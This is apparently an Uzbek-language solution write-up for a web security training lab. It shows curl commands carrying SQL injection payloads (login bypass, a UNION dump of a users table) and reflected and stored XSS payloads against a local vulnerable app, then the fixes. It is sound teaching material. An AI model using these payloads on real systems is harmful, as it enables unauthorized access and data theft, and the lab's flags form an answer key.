🌐 [Русский](./SOLUTION.md) · **Oʻzbekcha**

# A05 — Yechim (spoylerlar!)

Avval [README](./README.uz.md) dagi maslahatlardan foydalanib, laboratoriyani oʻzingiz bajarib koʻring.

Quyidagi barcha soʻrovlar vulnerable ga tegishli (port 8041).

## 1. Kirishni aylanib oʻtish

Ilovada soʻrov quyidagicha yigʻiladi:

```sql
SELECT username, role, secret FROM users WHERE username = '<login>' AND password = '<parol>'
```

Loginga `admin'--` qoʻyilsa, `--` dan keyingi hamma narsa izohga aylanadi va parol tekshiruvi yoʻqoladi:

```sql
... WHERE username = 'admin'--' AND password = 'x'
```

```bash
curl -H 'Content-Type: application/json' \
  -d "{\"username\":\"admin'--\",\"password\":\"x\"}" http://127.0.0.1:8041/login
# → admin sifatida kirish va FLAG{a05_sqli_login_bypass}
```

Boshqa variant: login `nobody' OR '1'='1' --`, shart doim rost boʻlib qoladi va kirish jadvaldagi birinchi foydalanuvchi nomidan bajariladi.

## 2. Yashirin mahsulot

```sql
SELECT id, name, price FROM products WHERE name LIKE '%<q>%' AND hidden = 0
```

```bash
curl -G http://127.0.0.1:8041/products --data-urlencode "q=%' OR 1=1 --"
# javobda FLAG{a05_hidden_product} bilan yashirin mahsulot paydo boʻladi
```

`OR 1=1` shartni rost qiladi, `--` esa `AND hidden = 0` ni tashlab yuboradi.

## 3. UNION: boshqa jadvaldan maʼlumotlar

Dastlabki soʻrov uchta ustun (`id`, `name`, `price`) qaytaradi, shuning uchun `UNION SELECT` da ham ular uchta boʻlishi kerak:

```bash
curl -G http://127.0.0.1:8041/products \
  --data-urlencode "q=' UNION SELECT id, username, secret FROM users --"
# name maydonida: admin, price maydonida: FLAG{a05_sqli_union_dump}
```

`q='` ni davomisiz sinab koʻring: ilova SQL xatosi matnini qaytaradi. Bunday xatolar hujumchiga soʻrov tuzilishini tushunishga yordam beradi, shuning uchun ularni foydalanuvchiga koʻrsatib boʻlmaydi.

## 4. XSS

**Qaytarilgan.** Skript parametrda keladi va darhol sahifaga tushadi. Brauzerda oching:

```
http://127.0.0.1:8041/search?q=<script>alert(1)</script>
```

**Saqlanuvchi.** Skript serverda saqlanadi va sahifani ochgan har kimda bajariladi:

```bash
curl -H 'Content-Type: application/json' \
  -d '{"name":"x","message":"<script>alert(1)</script>"}' http://127.0.0.1:8041/guestbook
```

Soʻng brauzerda http://127.0.0.1:8041/guestbook ni oching. Real tizimda `alert(1)` oʻrnida foydalanuvchi maʼlumotlarini oʻgʻirlaydigan kod boʻlishi mumkin edi, XSS shuning uchun xavfli.

Mehmonlar kitobi ilova xotirasida saqlanadi va qayta ishga tushirilganda tozalanadi.

## Tuzatishlar (fixed, port 8042)

| Muammo | Tuzatish |
|--------|----------|
| SQL da qatorlarni yopishtirish (kirish, qidiruv) | Parametrlangan soʻrovlar: `... WHERE username = ?`, `... LIKE ?` |
| Ekranlashsiz chiqarish (qidiruv, mehmonlar kitobi) | Chiqarishda `markupsafe.escape`: `<` `&lt;` ga aylanadi |
| Chuqurlashtirilgan himoya yoʻq | `Content-Security-Policy: default-src 'none'` sarlavhasi skriptlar bajarilishini taqiqlaydi, maydonlar uzunligi cheklangan |
| Parolni SQL ichida solishtirish | Parol kodda `hmac.compare_digest` orqali solishtiriladi |
| Javobda BD xatosi matni | SQL xatosi endi yuzaga kelmaydi, soʻrovlar kiritishga bogʻliq emas |

fixed da tekshirish (port 8042):

```bash
curl -H 'Content-Type: application/json' \
  -d "{\"username\":\"admin'--\",\"password\":\"x\"}" http://127.0.0.1:8042/login         # 401
curl -G http://127.0.0.1:8042/products --data-urlencode "q=' UNION SELECT id, username, secret FROM users --"   # []
curl "http://127.0.0.1:8042/search?q=<script>alert(1)</script>"   # javobda &lt;script&gt;...
```

## Yana nimani esda tutish kerak
- Ekranlash kontekstga bogʻliq (HTML, atribut, JavaScript, URL), shuning uchun avtomatik ekranlashli shablonizatordan foydalangan maʼqul.
- Parametrlash qiymatlarni himoya qiladi, lekin jadval va ustun nomlarini emas: ularni kiritishdan qoʻyib boʻlmaydi, faqat oq roʻyxatdan.
- Inyeksiyalar faqat SQL va HTML da emas: OT buyruqlari, LDAP, NoSQL-soʻrovlar ham bor. Tamoyil hamma joyda bitta: maʼlumotni kod bilan aralashtirib boʻlmaydi.
- Bu laboratoriyada parollar faqat soddalik uchun ochiq matnda saqlanadi. Parollarni saqlash haqida A04 laboratoriyasiga qarang.
